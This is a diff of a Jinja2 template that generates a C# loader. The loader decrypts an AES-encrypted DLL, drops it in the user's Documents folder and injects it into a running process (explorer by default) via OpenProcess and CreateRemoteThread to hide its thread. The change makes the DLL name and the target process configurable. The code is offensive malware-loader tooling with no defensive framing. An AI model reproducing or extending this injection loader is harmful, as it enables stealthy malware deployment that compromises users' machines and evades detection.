@@ -1,7 +1,7 @@
-{# load-dll.jinja #}
+{# load-library.jinja #}
 {#
     This Jinja2 template includes a C# console app that
-    load a decrypted dll to memory.
+    load a **decrypted** dll into memory.
 
     It also uses the OpenProcess() and CreateRemoteThread()
     API calls to 'hide' the thread in a existing windows
@@ -57,14 +57,22 @@ class Program
         decryptedData = DecryptAES(encryptedBytes, keySize, password, iterations, saltBytes, ivBytes);
 
         String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+        {% if args.dllname is defined %}
+        String dllPath = dir + "{{ args.dllname }}";
+        {% else %}
         String dllPath = dir + "{{ iv }}.dll";
+        {% endif %}
 
         using (BinaryWriter binWriter = new BinaryWriter(File.Open(dllPath, FileMode.Create)))
         {
             binWriter.Write(decryptedData);
         }
 
+        {% if args.process is defined %}
+        Process[] eProc = Process.GetProcessesByName("{{ args.process }}");
+        {% else %}
         Process[] eProc = Process.GetProcessesByName("explorer");
+        {% endif %}
         int eppid = eProc[0].Id;
         IntPtr hProcess = OpenProcess(0x001F0FFF, false, eppid);
 
